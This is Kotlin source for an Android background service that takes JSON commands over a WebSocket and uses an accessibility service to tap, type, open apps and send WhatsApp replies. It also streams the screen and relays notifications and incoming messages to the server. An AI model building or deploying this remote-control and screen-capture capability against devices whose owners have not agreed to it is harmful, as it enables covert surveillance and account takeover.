package com.remotecontrol.agent.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.*
import android.util.Log
import android.net.Uri
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.remotecontrol.agent.accessibility.RemoteAccessibilityService
import com.remotecontrol.agent.ui.MainActivity
import okhttp3.*
import java.util.concurrent.TimeUnit
import android.graphics.Bitmap
import android.graphics.ColorSpace
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import android.accessibilityservice.AccessibilityService

/**
 * AgentService — Foreground Service
 *
 * Keeps the app alive in background and maintains WebSocket connection
 * to the backend server. Receives JSON commands and delegates to the
 * appropriate handler (AccessibilityService, Package Manager, etc.)
 */
class AgentService : Service() {

    companion object {
        private const val TAG = "AgentService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "remote_control_channel"
        @Volatile
        var isConnected: Boolean = false
            private set
        @Volatile
        var instance: AgentService? = null
            private set
    }

    private val gson = Gson()
    private var webSocket: WebSocket? = null
    private lateinit var client: OkHttpClient
    private val handler = Handler(Looper.getMainLooper())
    private var reconnectRunnable: Runnable? = null

    @Volatile
    private var isStreaming = false
    private val captureExecutor = Executors.newSingleThreadExecutor()
    private val mainThreadExecutor = java.util.concurrent.Executor { command -> handler.post(command) }
    private val streamRunnable = object : Runnable {
        override fun run() {
            if (!isStreaming) return
            captureAndSendScreen()
        }
    }

    // ─── Service Lifecycle ────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        instance = this
        Preferences.init(this)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Conectando..."))
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(30, TimeUnit.SECONDS)
            .build()
        connect()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "AgentService started")
        return START_STICKY // Auto-restart if killed
    }

    override fun onDestroy() {
        super.onDestroy()
        isStreaming = false
        instance = null
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        handler.removeCallbacks(streamRunnable)
        captureExecutor.shutdown()
        webSocket?.close(1000, "Service destroyed")
        Log.i(TAG, "AgentService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    fun sendWsMessage(text: String) {
        webSocket?.send(text)
    }

    // ─── WebSocket Connection ─────────────────────────────────────────────

    private var currentUrlIndex = 0
    private val serverUrls by lazy {
        val stored = Preferences.serverUrl
        val urls = mutableListOf("ws://127.0.0.1:3002")
        if (stored.isNotBlank() && stored != "ws://127.0.0.1:3002") {
            urls.add(stored)
        }
        urls.toList()
    }

    private fun connect() {
        val baseUrl = serverUrls[currentUrlIndex]
        val url = "$baseUrl/?deviceId=${Preferences.deviceId}"
        Log.i(TAG, "Connecting WebSocket to: $url")
        val request = Request.Builder().url(url).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                isConnected = true
                Log.i(TAG, "WebSocket connected ✓ to $baseUrl")
                updateNotification("Conectado: $baseUrl")
                sendDeviceInfo(webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Received: $text")
                handleMessage(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                isConnected = false
                Log.w(TAG, "WebSocket closing: $reason")
                webSocket.close(1000, null)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                Log.e(TAG, "WebSocket failure on $baseUrl: ${t.message}")
                updateNotification("Reconectando...")
                // Cycle to the next URL for the next connection attempt
                currentUrlIndex = (currentUrlIndex + 1) % serverUrls.size
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        reconnectRunnable = Runnable { connect() }.also {
            handler.postDelayed(it, 5000) // Retry every 5s
        }
    }

    // ─── Device Info ──────────────────────────────────────────────────────

    private fun sendDeviceInfo(ws: WebSocket) {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val info = JsonObject().apply {
            addProperty("event", "device_info")
            addProperty("model", Build.MODEL)
            addProperty("manufacturer", Build.MANUFACTURER)
            addProperty("androidOS", Build.VERSION.RELEASE)
            addProperty("battery", battery)
            addProperty("deviceId", Preferences.deviceId)
        }
        ws.send(gson.toJson(info))
    }

    // ─── Command Handling ─────────────────────────────────────────────────

    private fun handleMessage(rawMessage: String) {
        try {
            val json = gson.fromJson(rawMessage, JsonObject::class.java)
            val command = json.get("command")?.asString ?: return
            val payload = json.getAsJsonObject("payload")

            Log.i(TAG, "Executing command: $command")

            val accessibility = RemoteAccessibilityService.instance

            when (command) {
                "PRESS_BACK"    -> accessibility?.pressBack()
                "PRESS_HOME"    -> accessibility?.pressHome()
                "PRESS_RECENTS" -> accessibility?.pressRecents()
                "PRESS_POWER"   -> accessibility?.lockScreen()

                "TAP" -> {
                    val x = payload?.get("x")?.asFloat ?: 500f
                    val y = payload?.get("y")?.asFloat ?: 1000f
                    accessibility?.tap(x, y)
                }

                "SWIPE" -> {
                    if (payload?.has("x1") == true) {
                        val x1 = payload.get("x1").asFloat
                        val y1 = payload.get("y1").asFloat
                        val x2 = payload.get("x2").asFloat
                        val y2 = payload.get("y2").asFloat
                        accessibility?.swipe(x1, y1, x2, y2)
                    } else {
                        val direction = payload?.get("direction")?.asString ?: "up"
                        when (direction) {
                            "up"    -> accessibility?.scrollUp()
                            "down"  -> accessibility?.scrollDown()
                            "left"  -> accessibility?.swipeLeft()
                            "right" -> accessibility?.swipeRight()
                        }
                    }
                }

                "SCROLL" -> {
                    val direction = payload?.get("direction")?.asString ?: "down"
                    if (direction == "up") accessibility?.scrollUp()
                    else accessibility?.scrollDown()
                }

                "TYPE_TEXT" -> {
                    val text = payload?.get("text")?.asString ?: ""
                    accessibility?.typeText(text)
                }

                "OPEN_APP" -> {
                    val pkg = payload?.get("package")?.asString ?: return
                    openApp(pkg)
                }

                "VOLUME_UP"   -> adjustVolume(true)
                "VOLUME_DOWN" -> adjustVolume(false)

                "SCREENSHOT" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        captureAndSendSingleScreenshot()
                        return
                    } else {
                        sendCommandResult("SCREENSHOT", "unsupported")
                        return
                    }
                }

                "START_SCREEN_STREAM" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        val accessibility = RemoteAccessibilityService.instance
                        if (accessibility != null) {
                            if (!isStreaming) {
                                isStreaming = true
                                handler.post(streamRunnable)
                                Log.i(TAG, "Native screen stream started")
                            }
                            sendCommandResult("START_SCREEN_STREAM", "success")
                        } else {
                            Log.w(TAG, "Accessibility service not running, cannot start stream")
                            sendCommandResult("START_SCREEN_STREAM", "accessibility_not_running")
                        }
                    } else {
                        Log.w(TAG, "Native stream not supported on this SDK version (< 30)")
                        sendCommandResult("START_SCREEN_STREAM", "unsupported")
                    }
                    return
                }

                "STOP_SCREEN_STREAM" -> {
                    if (isStreaming) {
                        isStreaming = false
                        handler.removeCallbacks(streamRunnable)
                        Log.i(TAG, "Native screen stream stopped")
                    }
                    sendCommandResult("STOP_SCREEN_STREAM", "success")
                    return
                }

                "AUTOMATION_WHATSAPP" -> {
                    val number = payload?.get("number")?.asString ?: return
                    val message = payload.get("message")?.asString ?: ""
                    try {
                        val encodedMessage = Uri.encode(message)
                        val intent = Intent(Intent.ACTION_VIEW).apply {
                            data = Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$encodedMessage")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        Log.i(TAG, "Automation WhatsApp: Intent launched for $number")

                        // Tenta clicar no enviar com retry: espera 3.5s, depois 1s, depois 1s
                        fun tryClickSend(delay: Long, attempt: Int) {
                            handler.postDelayed({
                                val accessibility = RemoteAccessibilityService.instance
                                if (accessibility != null) {
                                    val success = accessibility.clickWhatsAppSendButton()
                                    if (success) {
                                        Log.i(TAG, "Automation WhatsApp: send clicked on attempt $attempt")
                                        sendCommandResult("AUTOMATION_WHATSAPP", "success")
                                    } else if (attempt < 3) {
                                        Log.w(TAG, "Automation WhatsApp: send not found, retry $attempt")
                                        tryClickSend(1000, attempt + 1)
                                    } else {
                                        Log.w(TAG, "Automation WhatsApp: send button not found after 3 attempts")
                                        sendCommandResult("AUTOMATION_WHATSAPP", "send_button_not_found")
                                    }
                                } else {
                                    sendCommandResult("AUTOMATION_WHATSAPP", "accessibility_not_running")
                                }
                            }, delay)
                        }
                        tryClickSend(3500, 1)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error executing AUTOMATION_WHATSAPP: ${e.message}")
                        sendCommandResult("AUTOMATION_WHATSAPP", "error_${e.message}")
                    }
                    return
                }

                "OPEN_URL" -> {
                    val url = payload?.get("url")?.asString ?: return
                    try {
                        val intent = Intent(Intent.ACTION_VIEW).apply {
                            data = Uri.parse(url)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                        Log.i(TAG, "Open URL: Intent launched for $url")
                        sendCommandResult("OPEN_URL", "success")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error executing OPEN_URL: ${e.message}")
                        sendCommandResult("OPEN_URL", "error_${e.message}")
                    }
                    return
                }

                "SEND_BACKGROUND_REPLY" -> {
                    val sender = payload?.get("sender")?.asString ?: return
                    val app = payload.get("app")?.asString
                    val replyText = payload.get("message")?.asString ?: return
                    
                    // Se formos abrir por Acessibilidade a partir de segundo plano, queremos fechar o WhatsApp depois do envio
                    RemoteAccessibilityService.shouldCloseAppAfterReply = true

                    try {
                        val notificationService = NotificationService.instance
                        if (notificationService != null) {
                            val success = notificationService.replyToNotification(sender, app, replyText)
                            if (success) {
                                sendCommandResult("SEND_BACKGROUND_REPLY", "success")
                            } else {
                                // Fallback por Acessibilidade e Agenda de Contatos!
                                if (app == "WhatsApp" || app == "WhatsApp Business" || app == null) {
                                    Log.i(TAG, "Notificação ativa não encontrada. Tentando fallback via Acessibilidade...")
                                     
                                    val accessibility = RemoteAccessibilityService.instance
                                    if (accessibility == null) {
                                        Log.w(TAG, "Serviço de Acessibilidade não está ativo. Impossível realizar fallback.")
                                        sendCommandResult("SEND_BACKGROUND_REPLY", "failed_accessibility_not_running")
                                        return
                                    }

                                    // 1. Tenta obter o número do telefone
                                    var phoneNumber: String? = null
                                    if (isPhoneNumber(sender)) {
                                        phoneNumber = sender
                                    } else {
                                        phoneNumber = getPhoneNumberByName(sender)
                                    }
                                     
                                    if (phoneNumber != null) {
                                        val formatted = cleanPhoneNumber(phoneNumber)
                                        Log.i(TAG, "Número encontrado para $sender: $formatted. Disparando automação...")
                                         
                                        // 2. Define o estado pendente na Acessibilidade
                                        RemoteAccessibilityService.pendingReplyNumber = formatted
                                        RemoteAccessibilityService.pendingReplyText = replyText
                                         
                                        // 3. Dispara a intent do WhatsApp
                                        val intent = Intent(Intent.ACTION_VIEW).apply {
                                            data = android.net.Uri.parse("whatsapp://send?phone=$formatted")
                                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        }
                                        startActivity(intent)
                                         
                                        sendCommandResult("SEND_BACKGROUND_REPLY", "success_accessibility_fallback")
                                    } else {
                                        Log.w(TAG, "Não foi possível obter o número do telefone para $sender")
                                        sendCommandResult("SEND_BACKGROUND_REPLY", "failed_no_active_notification_or_number")
                                    }
                                } else {
                                    sendCommandResult("SEND_BACKGROUND_REPLY", "failed_no_active_notification")
                                }
                            }
                        } else {
                            sendCommandResult("SEND_BACKGROUND_REPLY", "notification_service_not_running")
                        }
                    } catch (e: java.lang.Exception) {
                        Log.e(TAG, "Error executing SEND_BACKGROUND_REPLY: ${e.message}")
                        sendCommandResult("SEND_BACKGROUND_REPLY", "error_${e.message}")
                    }
                    return
                }

                "SET_FOREGROUND_AUTOREPLY" -> {
                    val enabled = payload?.get("enabled")?.asBoolean ?: false
                    RemoteAccessibilityService.foregroundAutoReplyEnabled = enabled
                    Log.i(TAG, "Foreground auto-reply updated to: $enabled")
                    sendCommandResult("SET_FOREGROUND_AUTOREPLY", "success")
                    return
                }

                else -> Log.w(TAG, "Unknown command: $command")
            }

            sendCommandResult(command, "success")

        } catch (e: Exception) {
            Log.e(TAG, "Error handling message: ${e.message}")
        }
    }

    private fun openApp(packageName: String) {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Log.i(TAG, "Opened app: $packageName")
        } else {
            Log.w(TAG, "App not found: $packageName")
            sendCommandResult("OPEN_APP", "app_not_found")
        }
    }

    @Suppress("DEPRECATION")
    private fun adjustVolume(up: Boolean) {
        val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        val direction = if (up) android.media.AudioManager.ADJUST_RAISE else android.media.AudioManager.ADJUST_LOWER
        am.adjustStreamVolume(android.media.AudioManager.STREAM_MUSIC, direction, android.media.AudioManager.FLAG_SHOW_UI)
    }

    private fun captureAndSendScreen() {
        val accessibility = RemoteAccessibilityService.instance
        if (accessibility == null) {
            Log.w(TAG, "Accessibility service not running, cannot capture screen")
            handler.postDelayed(streamRunnable, 1000)
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                accessibility.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    mainThreadExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                            if (!isStreaming) {
                                screenshotResult.hardwareBuffer.close()
                                return
                            }
                            
                            captureExecutor.execute {
                                try {
                                    val hardwareBuffer = screenshotResult.hardwareBuffer
                                    val colorSpace = screenshotResult.colorSpace ?: ColorSpace.get(ColorSpace.Named.SRGB)
                                    val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                    if (bitmap != null) {
                                        val stream = ByteArrayOutputStream()
                                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
                                        val bytes = stream.toByteArray()
                                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                        
                                        val frameData = JsonObject().apply {
                                            addProperty("event", "screen_frame")
                                            addProperty("deviceId", Preferences.deviceId)
                                            addProperty("frame", base64)
                                        }
                                        webSocket?.send(gson.toJson(frameData))
                                    }
                                    hardwareBuffer.close()
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error compressing screenshot: ${e.message}")
                                } finally {
                                    handler.postDelayed(streamRunnable, 40) // ~25 FPS
                                }
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "takeScreenshot failed: $errorCode")
                            handler.postDelayed(streamRunnable, 200)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Exception in takeScreenshot: ${e.message}")
                handler.postDelayed(streamRunnable, 1000)
            }
        } else {
            isStreaming = false
        }
    }

    private fun captureAndSendSingleScreenshot() {
        val accessibility = RemoteAccessibilityService.instance ?: return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                accessibility.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    mainThreadExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                            captureExecutor.execute {
                                try {
                                    val hardwareBuffer = screenshotResult.hardwareBuffer
                                    val colorSpace = screenshotResult.colorSpace ?: ColorSpace.get(ColorSpace.Named.SRGB)
                                    val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                    if (bitmap != null) {
                                        val stream = ByteArrayOutputStream()
                                        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                                        val bytes = stream.toByteArray()
                                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                        
                                        val frameData = JsonObject().apply {
                                            addProperty("event", "screen_frame")
                                            addProperty("deviceId", Preferences.deviceId)
                                            addProperty("frame", base64)
                                        }
                                        webSocket?.send(gson.toJson(frameData))
                                        sendCommandResult("SCREENSHOT", "success")
                                    } else {
                                        sendCommandResult("SCREENSHOT", "failed_wrap_buffer")
                                    }
                                    hardwareBuffer.close()
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error compressing screenshot: ${e.message}")
                                    sendCommandResult("SCREENSHOT", "error_${e.message}")
                                }
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "takeScreenshot failed: $errorCode")
                            sendCommandResult("SCREENSHOT", "failed_$errorCode")
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Exception in takeScreenshot: ${e.message}")
                sendCommandResult("SCREENSHOT", "exception_${e.message}")
            }
        }
    }

    private fun sendCommandResult(command: String, result: String) {
        val response = JsonObject().apply {
            addProperty("event", "command_result")
            addProperty("command", command)
            addProperty("result", result)
            addProperty("deviceId", Preferences.deviceId)
        }
        webSocket?.send(gson.toJson(response))
    }

    fun relayWhatsAppMessage(sender: String, message: String) {
        val payload = JsonObject().apply {
            addProperty("event", "whatsapp_received")
            addProperty("sender", sender)
            addProperty("message", message)
            addProperty("deviceId", Preferences.deviceId)
            addProperty("timestamp", System.currentTimeMillis())
        }
        webSocket?.send(gson.toJson(payload))
    }

    fun relayNotification(packageName: String, title: String, text: String) {
        val payload = JsonObject().apply {
            addProperty("event", "notification_received")
            addProperty("packageName", packageName)
            addProperty("title", title)
            addProperty("text", text)
            addProperty("deviceId", Preferences.deviceId)
            addProperty("timestamp", System.currentTimeMillis())
        }
        webSocket?.send(gson.toJson(payload))
    }

    fun relayIncomingMessage(app: String, sender: String, message: String) {
        val payload = JsonObject().apply {
            addProperty("event", "message_received")
            addProperty("app", app)
            addProperty("sender", sender)
            addProperty("message", message)
            addProperty("deviceId", Preferences.deviceId)
            addProperty("timestamp", System.currentTimeMillis())
        }
        webSocket?.send(gson.toJson(payload))
    }

    // ─── Notification ─────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Remote Control Agent",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Background connection to the control server" }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(status: String): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Remote Control Agent")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(status: String) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIFICATION_ID, buildNotification(status))
    }

    // ─── Contacts Query & Formatting Helpers ─────────────────────────────────

    private fun getPhoneNumberByName(contactName: String): String? {
        val uri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
        val selection = "${android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} = ?"
        val selectionArgs = arrayOf(contactName)
        
        try {
            contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    return cursor.getString(0)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error querying contacts: ${e.message}")
        }
        return null
    }

    private fun cleanPhoneNumber(number: String): String {
        var digits = number.replace(Regex("[^0-9]"), "")
        if (digits.startsWith("0")) {
            digits = digits.substring(1)
        }
        if (digits.length == 10 || digits.length == 11) {
            digits = "55$digits" // Assume Brasil se não tiver DDI
        }
        return digits
    }

    private fun isPhoneNumber(text: String): Boolean {
        val clean = text.replace(Regex("[^0-9+]"), "")
        return clean.startsWith("+") || (clean.length >= 8 && clean.all { it.isDigit() })
    }
}
